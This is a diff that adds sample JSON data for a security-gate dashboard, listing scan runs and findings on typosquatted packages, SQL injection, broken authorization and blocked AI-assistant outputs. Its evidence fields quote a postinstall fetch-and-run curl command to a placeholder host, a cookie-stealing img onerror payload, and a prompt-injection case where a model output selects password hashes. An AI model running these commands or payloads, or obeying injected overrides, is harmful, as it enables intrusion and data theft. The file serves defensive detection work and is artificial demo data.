@@ -1,0 +1,388 @@
+{
+ "note": "Sample data for screenshots and local preview. Shapes match gate-server; values mirror this project's real results.",
+ "runs": [
+  {
+   "id": "c29be6f3-43e3-56d1-84f8-1e6345e21abe",
+   "module": "PKG",
+   "trigger": "CLAUDE_HOOK",
+   "target": "npm install react-dashboard-kit-pro",
+   "status": "DONE",
+   "startedAt": "2026-11-15T01:00:00Z",
+   "finishedAt": "2026-11-15T01:00:00Z"
+  },
+  {
+   "id": "f617fe79-5643-5353-876a-7d5812a4e9a1",
+   "module": "PKG",
+   "trigger": "CLAUDE_HOOK",
+   "target": "npm install lodahs",
+   "status": "DONE",
+   "startedAt": "2026-11-15T01:05:00Z",
+   "finishedAt": "2026-11-15T01:05:00Z"
+  },
+  {
+   "id": "acd455b1-4e15-5c19-80f1-a8f8beefd08a",
+   "module": "PKG",
+   "trigger": "GITHUB_ACTION",
+   "target": "PR #12 package.json",
+   "status": "DONE",
+   "startedAt": "2026-11-15T02:00:00Z",
+   "finishedAt": "2026-11-15T02:00:00Z"
+  },
+  {
+   "id": "ce4fa1e2-7ea2-5556-ba04-7c572d88816a",
+   "module": "REVIEW",
+   "trigger": "GITHUB_ACTION",
+   "target": "review 7cc061f..demo/gate-review-pr",
+   "status": "DONE",
+   "startedAt": "2026-11-15T03:00:00Z",
+   "finishedAt": "2026-11-15T03:00:00Z"
+  },
+  {
+   "id": "0f3d698f-8355-5552-be82-c2441e32f58c",
+   "module": "AUTHZ",
+   "trigger": "CLI",
+   "target": "http://127.0.0.1:8081",
+   "status": "DONE",
+   "startedAt": "2026-11-15T04:00:00Z",
+   "finishedAt": "2026-11-15T04:00:00Z"
+  },
+  {
+   "id": "1d9a169f-9789-58c6-a394-6f4024893fae",
+   "module": "PROMPT",
+   "trigger": "CLI",
+   "target": "gate-prompt measurement corpus",
+   "status": "DONE",
+   "startedAt": "2026-11-15T05:00:00Z",
+   "finishedAt": "2026-11-15T05:00:00Z"
+  }
+ ],
+ "findings": [
+  {
+   "id": "7cb690fa-a1d4-594f-86b1-03f45e345f0f",
+   "runId": "c29be6f3-43e3-56d1-84f8-1e6345e21abe",
+   "module": "PKG",
+   "ruleId": "PKG-EXIST",
+   "title": "'react-dashboard-kit-pro' does not exist on npm (possibly hallucinated by an AI tool)",
+   "severity": "HIGH",
+   "decision": "BLOCK",
+   "location": {
+    "kind": "package",
+    "ecosystem": "npm",
+    "name": "react-dashboard-kit-pro",
+    "version": "latest"
+   },
+   "evidence": {
+    "registry": "https://registry.npmjs.org",
+    "status": 404
+   },
+   "source": "RULE",
+   "fingerprint": "11c7f2e38bc880d7287c201ff36cf33a89b94c6763ed2c6580305f682bf95590",
+   "detectedAt": "2026-11-15T01:00:01Z"
+  },
+  {
+   "id": "168785a4-ea5f-589c-9dc4-63204099ff9d",
+   "runId": "f617fe79-5643-5353-876a-7d5812a4e9a1",
+   "module": "PKG",
+   "ruleId": "PKG-TYPO",
+   "title": "'lodahs' looks like the popular package 'lodash'",
+   "severity": "HIGH",
+   "decision": "BLOCK",
+   "location": {
+    "kind": "package",
+    "ecosystem": "npm",
+    "name": "lodahs",
+    "version": "1.0.0"
+   },
+   "evidence": {
+    "similarTo": "lodash",
+    "technique": "transposition",
+    "weeklyDownloads": 31
+   },
+   "source": "RULE",
+   "fingerprint": "a21f99017accf88230d36aae07e6bedca634ab51b538868b5d6ad9671bea2001",
+   "detectedAt": "2026-11-15T01:05:01Z"
+  },
+  {
+   "id": "2e8afce9-b116-5140-a5ad-5be349a2c7f0",
+   "runId": "f617fe79-5643-5353-876a-7d5812a4e9a1",
+   "module": "PKG",
+   "ruleId": "PKG-SCRIPT",
+   "title": "install script runs network code",
+   "severity": "CRITICAL",
+   "decision": "BLOCK",
+   "location": {
+    "kind": "package",
+    "ecosystem": "npm",
+    "name": "lodahs",
+    "version": "1.0.0"
+   },
+   "evidence": {
+    "script": "postinstall",
+    "excerpt": "curl -s https://collector.example.invalid/x | sh"
+   },
+   "source": "RULE",
+   "fingerprint": "05af6f4e218c7e7fd0486641d97a4e6bc34152839cd4bef5f164351f46e8c9e1",
+   "detectedAt": "2026-11-15T01:05:02Z"
+  },
+  {
+   "id": "b3fd8ea6-dd70-5c24-88fe-6d3f8405c8d4",
+   "runId": "acd455b1-4e15-5c19-80f1-a8f8beefd08a",
+   "module": "PKG",
+   "ruleId": "PKG-MAINT",
+   "title": "'d3-array@3.2.5' was published by 'GitHub Actions', who was not a maintainer of the previous version",
+   "severity": "HIGH",
+   "decision": "WARN",
+   "location": {
+    "kind": "package",
+    "ecosystem": "npm",
+    "name": "d3-array",
+    "version": "3.2.5"
+   },
+   "evidence": {
+    "publisher": "GitHub Actions",
+    "previousMaintainers": [
+     "mbostock"
+    ]
+   },
+   "source": "RULE",
+   "fingerprint": "2147b7d169668f323a92810745356c045b3db7925ebf0ce20177530e0d568197",
+   "detectedAt": "2026-11-15T02:00:01Z"
+  },
+  {
+   "id": "bde6d326-6d22-58f9-b798-a6140f0f5399",
+   "runId": "acd455b1-4e15-5c19-80f1-a8f8beefd08a",
+   "module": "PKG",
+   "ruleId": "PKG-NEW",
+   "title": "Version '8.5.33' of 'postcss' was published 17 hour(s) ago",
+   "severity": "MEDIUM",
+   "decision": "WARN",
+   "location": {
+    "kind": "package",
+    "ecosystem": "npm",
+    "name": "postcss",
+    "version": "8.5.33"
+   },
+   "evidence": {
+    "ageHours": 17
+   },
+   "source": "RULE",
+   "fingerprint": "93cb0f3088f1456ee4b2154ff818ca055c46733a0ee86aa8848610c6b217c8b4",
+   "detectedAt": "2026-11-15T02:00:02Z"
+  },
+  {
+   "id": "cec4cb3a-f45d-5b0d-b518-75f8ae2727e7",
+   "runId": "ce4fa1e2-7ea2-5556-ba04-7c572d88816a",
+   "module": "REVIEW",
+   "ruleId": "REVIEW-gate-java-sql-string-concat",
+   "title": "Request input reaches a SQL statement through string concatenation.",
+   "severity": "HIGH",
+   "decision": "BLOCK",
+   "location": {
+    "kind": "file",
+    "path": "demo/shop/src/main/java/demo/shop/OrderExportController.java",
+    "line": 28
+   },
+   "evidence": {
+    "engine": "semgrep 1.182.1",
+    "rule": "gate-java-sql-string-concat",
+    "cwe": "CWE-89",
+    "lines": "26-28",
+    "code": "return jdbc.queryForList(sql, user.getName());"
+   },
+   "source": "RULE",
+   "fingerprint": "cd56b57cbfc5d2a87248242a48c0aac7ecf66133e3fc6072bc4351063b05e68d",
+   "detectedAt": "2026-11-15T03:00:05Z"
+  },
+  {
+   "id": "8b8936d4-c22d-51b0-9584-8b7266155f94",
+   "runId": "ce4fa1e2-7ea2-5556-ba04-7c572d88816a",
+   "module": "REVIEW",
+   "ruleId": "REVIEW-AI-CWE-639",
+   "title": "Order detail returns any order without checking the owner",
+   "severity": "HIGH",
+   "decision": "WARN",
+   "location": {
+    "kind": "file",
+    "path": "demo/shop/src/main/java/demo/shop/OrderExportController.java",
+    "line": 33
+   },
+   "evidence": {
+    "model": "claude-opus-5-5",
+    "cwe": "CWE-639",
+    "evidence": "order(Principal user, long id) reads by id only; user is unused",
+    "quotedCode": "\"SELECT id, owner, item, amount, status, card_last4, address FROM orders WHERE id = ?\", id);",
+    "confidence": "high"
+   },
+   "source": "AI",
+   "fingerprint": "a5e5ee3419480829559b8a24ffa7065c08237b55f55fa720879b4d24f69c2331",
+   "detectedAt": "2026-11-15T03:00:06Z"
+  },
+  {
+   "id": "e4f48b3f-d45d-50b1-be10-37781260fb96",
+   "runId": "0f3d698f-8355-5552-be82-c2441e32f58c",
+   "module": "AUTHZ",
+   "ruleId": "AUTHZ-BOLA-READ",
+   "title": "User A can read user B's object via 'GET /api/orders/{id}'",
+   "severity": "HIGH",
+   "decision": "BLOCK",
+   "location": {
+    "kind": "endpoint",
+    "method": "GET",
+    "path": "/api/orders/{id}"
+   },
+   "evidence": {
+    "userA": "alice",
+    "userB": "bob",
+    "status": 200,
+    "verified": "same id and owner"
+   },
+   "source": "RULE",
+   "fingerprint": "3d5cfbb372d93832a52998cab2d7a070c1bd9df5ce3964528fff51fa63c145d5",
+   "detectedAt": "2026-11-15T04:00:01Z"
+  },
+  {
+   "id": "2b170819-3f39-59cf-a37d-2957ea5c0e48",
+   "runId": "0f3d698f-8355-5552-be82-c2441e32f58c",
+   "module": "AUTHZ",
+   "ruleId": "AUTHZ-BOLA-WRITE",
+   "title": "User A can modify user B's object via 'PUT /api/orders/{id}'",
+   "severity": "CRITICAL",
+   "decision": "BLOCK",
+   "location": {
+    "kind": "endpoint",
+    "method": "PUT",
+    "path": "/api/orders/{id}"
+   },
+   "evidence": {
+    "userA": "alice",
+    "userB": "bob",
+    "status": 200,
+    "verified": "B re-read the object"
+   },
+   "source": "RULE",
+   "fingerprint": "faad6a37c1d550d29b404661f4cc95ba35c6ad9c18f0cbdccccf0aec9ffa75b4",
+   "detectedAt": "2026-11-15T04:00:02Z"
+  },
+  {
+   "id": "c4537a54-f9b3-5321-a87d-31db7291d8db",
+   "runId": "0f3d698f-8355-5552-be82-c2441e32f58c",
+   "module": "AUTHZ",
+   "ruleId": "AUTHZ-BOLA-DELETE",
+   "title": "User A can delete user B's object via 'DELETE /api/orders/{id}'",
+   "severity": "CRITICAL",
+   "decision": "BLOCK",
+   "location": {
+    "kind": "endpoint",
+    "method": "DELETE",
+    "path": "/api/orders/{id}"
+   },
+   "evidence": {
+    "userA": "alice",
+    "userB": "bob",
+    "status": 204,
+    "verified": "B re-read the object"
+   },
+   "source": "RULE",
+   "fingerprint": "57c5758f4c3b1c21354e129c20bde89a7e8e4cd785501fb440cecb722c65aac1",
+   "detectedAt": "2026-11-15T04:00:03Z"
+  },
+  {
+   "id": "b3847fb7-d4c1-583c-89e8-903b5ff43ed5",
+   "runId": "1d9a169f-9789-58c6-a394-6f4024893fae",
+   "module": "PROMPT",
+   "ruleId": "PROMPT-SQL-TABLE",
+   "title": "AI output blocked: override + other table",
+   "severity": "HIGH",
+   "decision": "BLOCK",
+   "location": {
+    "kind": "endpoint",
+    "method": "POST",
+    "path": "/api/assistant/order-search"
+   },
+   "evidence": {
+    "case": "S01",
+    "reason": "only table 'orders' may be read",
+    "inputSignals": [
+     "PROMPT-IN-OVERRIDE",
+     "PROMPT-IN-CODE"
+    ],
+    "modelOutput": "SELECT username, password_hash FROM users"
+   },
+   "source": "RULE",
+   "fingerprint": "94c99afbcf83c0e92739195a144e247946af0533d7f892464e738690fbc95031",
+   "detectedAt": "2026-11-15T05:00:01Z"
+  },
+  {
+   "id": "4e1af11a-2973-509a-99a4-a065c3412bdb",
+   "runId": "1d9a169f-9789-58c6-a394-6f4024893fae",
+   "module": "PROMPT",
+   "ruleId": "PROMPT-ACTION-NOT-OWNER",
+   "title": "AI output blocked: another user's order",
+   "severity": "HIGH",
+   "decision": "BLOCK",
+   "location": {
+    "kind": "endpoint",
+    "method": "POST",
+    "path": "/api/assistant/order-action"
+   },
+   "evidence": {
+    "case": "A01",
+    "reason": "orderId 20 does not belong to the current user",
+    "inputSignals": []
+   },
+   "source": "RULE",
+   "fingerprint": "29ecf14578d93af3a5a284424dc733ba4118382d85fda0c3df31d023b6735135",
+   "detectedAt": "2026-11-15T05:00:02Z"
+  },
+  {
+   "id": "981ca53b-21c4-53c1-bf20-91e0e6509f76",
+   "runId": "1d9a169f-9789-58c6-a394-6f4024893fae",
+   "module": "PROMPT",
+   "ruleId": "PROMPT-HTML-REMOVED",
+   "title": "Active HTML removed: img onerror",
+   "severity": "HIGH",
+   "decision": "WARN",
+   "location": {
+    "kind": "endpoint",
+    "method": "POST",
+    "path": "/api/assistant/review-summary"
+   },
+   "evidence": {
+    "case": "H02",
+    "reason": "no active HTML",
+    "removed": "<img src=x onerror=\"alert(document.cookie)\">",
+    "inputSignals": [
+     "PROMPT-IN-CODE"
+    ]
+   },
+   "source": "RULE",
+   "fingerprint": "9cd87f755d318eeff144a4c77152007a3e96a753d10c72bb175849552d464a49",
+   "detectedAt": "2026-11-15T05:00:03Z"
+  },
+  {
+   "id": "d7a568ba-c600-5289-88f3-8a920b8c7192",
+   "runId": "1d9a169f-9789-58c6-a394-6f4024893fae",
+   "module": "PROMPT",
+   "ruleId": "PROMPT-IN-OVERRIDE",
+   "title": "Injection signal in input (recorded): quotes a scam message",
+   "severity": "LOW",
+   "decision": "WARN",
+   "location": {
+    "kind": "endpoint",
+    "method": "POST",
+    "path": "/api/assistant/order-search"
+   },
+   "evidence": {
+    "case": "SB09",
+    "kind": "BENIGN",
+    "reason": "1 row(s) of the current user",
+    "inputSignals": [
+     "PROMPT-IN-OVERRIDE"
+    ]
+   },
+   "source": "RULE",
+   "fingerprint": "92feddc3921da8741ee301774bf5a6b046a3ae390037200c863701c192a40455",
+   "detectedAt": "2026-11-15T05:00:04Z"
+  }
+ ]
+}
